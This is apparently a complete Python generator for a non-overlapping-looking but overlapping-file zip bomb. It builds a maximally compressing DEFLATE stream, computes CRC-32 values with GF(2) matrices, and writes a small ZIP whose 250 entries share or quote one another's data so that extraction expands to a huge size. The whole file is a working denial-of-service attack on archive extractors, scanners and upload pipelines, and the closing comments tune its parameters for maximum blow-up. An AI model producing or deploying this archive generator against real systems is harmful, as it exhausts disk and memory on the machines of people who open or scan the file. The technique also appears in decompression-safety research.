#!/usr/bin/env python3

import binascii
import struct
import sys


CHOSEN_BYTE = b"A"


# CRC-32 precomputation using matrices in GF(2). Similar to crc32_combine in
# zlib. See https://stackoverflow.com/a/23126768 for a description of the idea.
# Here, we use a 33-bit state where the dummy 33rd coordinate is always 1
# (similar to homogeneous coordinates). Matrices are represented as 33-element
# lists, where each element is a 33-bit integer representing one column.

CRC_POLY = 0xedb88320

def matrix_mul_vector(m, v):
    r = 0
    for shift in range(len(m)):
        if (v>>shift) & 1 == 1:
            r ^= m[shift]
    return r

def matrix_mul(a, b):
    assert len(a) == len(b)
    return [matrix_mul_vector(a, v) for v in b]

def identity_matrix():
    return [1<<shift for shift in range(33)]

# Matrix that updates CRC-32 state for a 0 bit.
CRC_M0 = [CRC_POLY] + [1<<shift for shift in range(31)] + [1<<32]
# Matrix that flips the LSb (x^31 in the polynomial).
CRC_MFLIP = [1<<shift for shift in range(32)] + [(1<<32) + 1]
# Matrix that updates CRC-32 state for a 1 bit: flip the LSb, then act as for a 0 bit.
CRC_M1 = matrix_mul(CRC_M0, CRC_MFLIP)

def precompute_crc_matrix(data):
    m = identity_matrix()
    for b in data:
        for shift in range(8):
            m = matrix_mul([CRC_M0, CRC_M1][(b>>shift)&1], m)
    return m

def precompute_crc_matrix_repeated(data, n):
    accum = precompute_crc_matrix(data)
    # Square-and-multiply algorithm to compute m = accum^n.
    m = identity_matrix()
    while n > 0:
        if n & 1 == 1:
            m = matrix_mul(m, accum)
        accum = matrix_mul(accum, accum)
        n >>= 1
    return m

def crc_matrix_apply(m, value=0):
    return (matrix_mul_vector(m, (value^0xffffffff)|(1<<32)) & 0xffffffff) ^ 0xffffffff


# DEFLATE stuff, see RFC 1951.

class BitBuffer:
    def __init__(self):
        self.done = []
        self.current = 0
        self.bit_pos = 0

    def push(self, x, n):
        assert x == x % (1<<n), (bin(x), n)
        while n >= (8 - self.bit_pos):
            self.current |= (x << self.bit_pos) & 0xff
            x >>= (8 - self.bit_pos)
            n -= (8 - self.bit_pos)
            self.done.append(self.current)
            self.current = 0
            self.bit_pos = 0
        self.current |= (x << self.bit_pos) & 0xff
        self.bit_pos += n

    def push_rev(self, x, n):
        mask = (1<<n)>>1
        while mask > 0:
            self.push(x&mask != 0 and 1 or 0, 1)
            mask >>= 1

    def bytes(self):
        out = bytes(self.done)
        if self.bit_pos != 0:
            out += bytes([self.current])
        return out

# Return a block of data whose compressed size is as specified. Returns a tuple
# (compressed_data, uncompressed_size, crc_matrix).
def get_compressed(compressed_size):
    bits = BitBuffer()

    # BFINAL=1
    bits.push(0b1, 1)
    # BTYPE=10: dynamic Huffman codes
    bits.push(0b10, 2)
    # HLIT=29: 257 + 29 = 286 literal/length codes (code 285 is what gives max compression)
    bits.push(0b11101, 5)
    # HDIST=0: 1 + 0 = 1 distance code
    bits.push(0b00000, 5)
    # HCLEN=14: 4 + 14 = 18 code length codes (we need code length 1 which is at position 17).
    bits.push(0b1110, 4)

    # Huffman tree for code lengths. Contains HCLEN+4 entries. Supply code
    # lengths:
    #  sym length
    #    0 2
    #    1 3
    #    2 3
    #   18 1
    # which define the tree:
    #  sym code
    #    0 10
    #    1 110
    #    2 111
    #   18 0
    bits.push(0b000, 3) # 16
    bits.push(0b000, 3) # 17
    bits.push(0b001, 3) # 18
    bits.push(0b010, 3) # 0
    bits.push(0b000, 3) # 8
    bits.push(0b000, 3) # 7
    bits.push(0b000, 3) # 9
    bits.push(0b000, 3) # 6
    bits.push(0b000, 3) # 10
    bits.push(0b000, 3) # 5
    bits.push(0b000, 3) # 11
    bits.push(0b000, 3) # 4
    bits.push(0b000, 3) # 12
    bits.push(0b000, 3) # 3
    bits.push(0b000, 3) # 13
    bits.push(0b011, 3) # 2
    bits.push(0b000, 3) # 14
    bits.push(0b011, 3) # 1
    code_lengths = {
         0: ( 0b10, 2),
         1: (0b110, 3),
         2: (0b111, 3),
        18: (  0b0, 1),
    }

    # Huffman tree for literal/length values. Contains HLIT+257 entries. Code
    # lengths are represented in terms of the code_lengths tree just defined.
    # Supply code lengths:
    #          sym length
    #  CHOSEN_BYTE 2    (literal byte)
    #          256 2    (end of stream)
    #          285 1    (length 258)
    # which define the tree:
    #          sym code
    #  CHOSEN_BYTE 10   (literal byte)
    #          256 11   (end of stream)
    #          285 0    (length 258)

    # Skip n literal/length slots.
    def skip(n):
        while n >= 11:
            x = min(n, 138)
            bits.push_rev(*code_lengths[18]) # 7 bits of length to follow
            bits.push(x - 11, 7)
            n -= x
        while n > 0:
            bits.push_rev(*code_lengths[0])
            n -= 1
    skip(ord(CHOSEN_BYTE))
    bits.push_rev(*code_lengths[2]) # code for literal byte
    skip(256 - (ord(CHOSEN_BYTE) + 1))
    bits.push_rev(*code_lengths[2]) # code for 256, end of stream
    skip(285 - 257)
    bits.push_rev(*code_lengths[1]) # code for 285, copy 258 bytes

    # Huffman tree for distances. Contains HDIST+1 entries. We only use code 0
    # meaning a distance of 1. "If only one distance code is used, it is encoded
    # using one bit, not zero bits; in this case there is a single code length
    # of one, with one unused code."
    bits.push_rev(*code_lengths[1])

    # A literal byte to start the whole process.
    bits.push_rev(0b10, 2)
    uncompressed_size = 1

    # Now every pair of 0 bits encodes 258 copies of CHOSEN_BYTE.
    is_even = bits.bit_pos % 2 == 0
    # Including whatever zero bits remain at the end of the bit buffer.
    uncompressed_size += (8 - bits.bit_pos) // 2 * 258
    prefix = bits.bytes()

    if is_even:
        suffix = bytes([0b11000000])
    else:
        suffix = bytes([0b01100000])
    # It takes 2 bits to encode the end of stream, which leaves 6 bits that
    # encode compressed data. In the !is_even case, 1 of the 6 bits is borrowed
    # from the prefix.
    uncompressed_size += 3 * 258

    body = b"\x00" * (compressed_size - len(prefix) - len(suffix))
    uncompressed_size += len(body) * 4 * 258

    compressed_data = prefix + body + suffix
    assert len(compressed_data) == compressed_size
    return compressed_data, uncompressed_size, precompute_crc_matrix_repeated(CHOSEN_BYTE, uncompressed_size)


# APPNOTE.TXT 4.4.5
# 8 - The file is Deflated
COMPRESSION_METHOD_DEFLATE = 8

MOD_DATE = 0x0548
MOD_TIME = 0x6ca0

class LocalFileHeader:
    def __init__(self, compressed_size, uncompressed_size, crc, filename, extra_length):
        self.compressed_size = compressed_size
        self.uncompressed_size = uncompressed_size
        self.crc = crc
        self.filename = filename
        self.extra_length = extra_length

    def serialize(self):
        # APPNOTE.TXT 4.3.7
        return struct.pack("<LHHHHHLLLHH",
            0x04034b50, # signature
            20,         # zip version 2.0
            0,          # flags
            COMPRESSION_METHOD_DEFLATE, # compression method
            MOD_TIME,   # modification time
            MOD_DATE,   # modification date
            self.crc,   # CRC-32
            self.compressed_size,   # compressed size
            self.uncompressed_size, # uncompressed size
            len(self.filename),     # filename length
            self.extra_length,      # extra length
        ) + self.filename

class CentralDirectoryHeader:
    # template is a LocalFileHeader instance.
    def __init__(self, local_file_header_offset, template):
        self.local_file_header_offset = local_file_header_offset
        self.compressed_size = template.compressed_size
        self.uncompressed_size = template.uncompressed_size
        self.crc = template.crc
        self.filename = template.filename

    def serialize(self):
        # APPNOTE.TXT 4.3.12
        return struct.pack("<LHHHHHHLLLHHHHHLL",
            0x02014b50, # signature
            20,         # version made by
            0,          # version needed to extract
            0,          # flags
            COMPRESSION_METHOD_DEFLATE, # compression method
            MOD_TIME,   # modification time
            MOD_DATE,   # modification date
            self.crc,   # CRC-32
            self.compressed_size,   # compressed size
            self.uncompressed_size, # uncompressed size
            len(self.filename),     # filename length
            0,          # extra length
            0,          # file comment length
            0,          # disk number where file starts
            0,          # internal file attributes
            0,          # external file attributes
            self.local_file_header_offset,  # offset of local file header
        ) + self.filename

class EndOfCentralDirectory:
    def __init__(self, cd_num_entries, cd_size, cd_offset):
        self.cd_num_entries = cd_num_entries
        self.cd_size = cd_size
        self.cd_offset = cd_offset

    def serialize(self):
        # APPNOTE.TXT 4.3.16
        return struct.pack("<LHHHHLLH",
            0x06054b50, # signature
            0,          # number of this disk
            0,          # disk of central directory
            self.cd_num_entries,    # number of central directory entries on this disk
            self.cd_num_entries,    # number of central directory entries total
            self.cd_size,   # size of central directory
            self.cd_offset, # offset of central directory
            0,          # comment length
        )


FILENAME_LETTERS = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
def filename_for_index(i):
    letters = []
    while True:
        letters.insert(0, FILENAME_LETTERS[i % len(FILENAME_LETTERS)])
        i = i // len(FILENAME_LETTERS) - 1
        if i < 0:
            break
    return bytes(letters)

def write_zip_full_reuse(f, compressed_size, num_copies):
    compressed_data, uncompressed_size, crc_matrix = get_compressed(compressed_size)

    main_crc = crc_matrix_apply(crc_matrix)
    main_file = LocalFileHeader(len(compressed_data), uncompressed_size, main_crc, filename_for_index(0), 0)

    offset = 0
    main_file_offset = offset
    offset += f.write(main_file.serialize())
    offset += f.write(compressed_data)

    cd_offset = offset
    for i in range(num_copies):
        cd_header = CentralDirectoryHeader(main_file_offset, main_file)
        cd_header.filename = filename_for_index(i)
        offset += f.write(cd_header.serialize())
    cd_size = offset - cd_offset

    offset += f.write(EndOfCentralDirectory(num_copies, cd_size, cd_offset).serialize())

    return offset

def write_zip_quoted_reuse(f, compressed_size, num_additional):
    class FileRecord:
        def __init__(self, header, data):
            self.header = header
            self.data = data

    # We build the file table backwards on a stack, starting with the file that
    # actually contains the bulk of the compressed data.
    files = []
    compressed_data, uncompressed_size, crc_matrix = get_compressed(compressed_size)
    header = LocalFileHeader(len(compressed_data), uncompressed_size, crc_matrix_apply(crc_matrix), filename_for_index(num_additional), 0)
    files.append(FileRecord(header, compressed_data))

    crc_matrix = precompute_crc_matrix_repeated(b"\x00", uncompressed_size)

    for i in range(num_additional):
        # The file that will follow this one is the one that has most recently
        # been added to the stack.
        next_file = files[-1]
        next_header_bytes = next_file.header.serialize()

        # Here we do a crc32_combine operation to compute the CRC of
        # prefix+remainder, knowing crc32(prefix), crc32(remainder), and a
        # matrix that computes the effect of len(remainder) 0x00 bytes.
        # Basically it's the xor of crc32(remainder) and crc32(prefix + zeroes),
        # where the latter quantity is the result of applying the matrix to
        # crc32(prefix).
        crc1 = binascii.crc32(next_header_bytes)
        crc2 = next_file.header.crc
        # Undo the pre- and post-conditioning that crc_matrix_apply does,
        # because crc1 and crc2 are already conditioned.
        new_crc = crc_matrix_apply(crc_matrix, crc1 ^ 0xffffffff) ^ 0xffffffff ^ crc2
        # Next file will have an additional len(next_header_bytes) accumulated
        # into crc_matrix.
        crc_matrix = matrix_mul(crc_matrix, precompute_crc_matrix_repeated(b"\x00", len(next_header_bytes)))

        # Place a non-final non-compressed DEFLATE block (BFINAL=0, BTYPE=00)
        # that quotes the following Local File Header and joins up with the
        # DEFLATE stream that it contains.
        quote = struct.pack("<BHH", 0x00, len(next_header_bytes), len(next_header_bytes) ^ 0xffff)
        header = LocalFileHeader(
            len(quote) + len(next_header_bytes) + next_file.header.compressed_size,
            len(next_header_bytes) + next_file.header.uncompressed_size,
            new_crc,
            filename_for_index(num_additional - i - 1),
            0,
        )
        files.append(FileRecord(header, quote))

    central_directory = []
    offset = 0
    while files:
        record = files.pop()
        central_directory.append(CentralDirectoryHeader(offset, record.header))
        offset += f.write(record.header.serialize())
        offset += f.write(record.data)

    cd_offset = offset
    for cd_header in central_directory:
        offset += f.write(cd_header.serialize())
    cd_size = offset - cd_offset

    offset += f.write(EndOfCentralDirectory(len(central_directory), cd_size, cd_offset).serialize())

    return offset


# write_zip_full_reuse(sys.stdout.buffer, 20000, 20000//48)
write_zip_quoted_reuse(sys.stdout.buffer, 21078+16, 250)

# S compressed file data
# N * 30 Local File Headers
# N * 46 Central Directory Headers
# N * 2 * ~2 filenames
# (N-1) * 5 quotes
# 16 bytes DEFLATE overhead (represents 1033 bytes itself)
#
# maximize (1033 + (S - 16) * 1032) * N + 32 * (N - 1)
# subject to
#   16 + S + N * (30 + 46 + 4) + (N-1)*5 + 22 <= 42374
#
# max (33 + (S - 15) * 1032) * N - 32
#     (1032*S - 15447) * N
#     (1032*(42331 - 85*N) - 15447) * N
#     43670115*N - 87720*N*N
#     => max integer N at N=250 => S=21081
#
#   S = 42331 - 85*N
#   N = (42331 - S)/85
